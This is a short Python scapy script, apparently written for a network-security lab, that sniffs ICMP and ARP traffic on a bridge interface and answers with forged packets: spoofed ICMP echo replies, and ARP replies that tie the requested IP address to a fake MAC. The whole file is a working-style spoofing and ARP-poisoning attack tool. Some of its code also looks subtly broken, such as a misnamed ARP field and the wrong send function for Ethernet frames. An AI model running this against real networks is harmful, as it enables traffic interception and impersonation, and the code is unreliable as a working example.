from scapy.all import *

mac_spoof='03:55:0a:ff:b2:02'


def my_sniff():
    pkt=sniff(iface='br-37d209eea436', filter='icmp or arp',prn=my_spoof)

def my_spoof(pkt):
    pkt.show()
    ip_target=pkt.sprintf('%IP.src%')
    ip_spoof=pkt.sprintf('%IP.dst%')
    proto_ip=pkt.sprintf('%IP.proto%')
    type_eth=pkt.sprintf('%Ether.type%')
    #print("type_eth:"+type_eth)
    print('proto:'+proto_ip)
    if proto_ip=='icmp':
        print('[+] ICMP spoof')
        print('trg:'+ip_target)
        print('src_spoof:'+ip_spoof)
        #Ethernet
        #eth=Ether()
        #eth.src=mac_spoof
        #eth.dst=pkt.sprintf('%Ether.src%')
        #IP
        ip=IP()
        ip.src=ip_spoof
        ip.dst=ip_target
        ip.ttl=0
        #ICMP
        icmp=ICMP()
        icmp.type='echo-reply'
        icmp.id=pkt[ICMP].id
        icmp.seq=pkt[ICMP].seq
        send(ip/icmp/pkt[Raw].load)
    elif type_eth=='ARP':
        print('[+] ARP spoof')
        #Ethernet
        eth=Ether()
        eth.src=mac_spoof
        eth.dst=pkt.sprintf('%Ether.src%')
        print('eth.src:'+eth.src)
        print('eth.dst:'+eth.dst)
        #IP
        #ip=IP()
        #ip.src=ip_spoof
        #ip.dst=ip_target
        ##ARP
        arp=ARP()
        arp.opt='is-at'
        arp.hwsrc=mac_spoof
        arp.psrc=ip_spoof
        arp.hwdst=pkt.sprintf('%eth.src%')
        arp.pdst=ip_target
        send(eth/arp)

if __name__=="__main__":
    my_sniff()
    
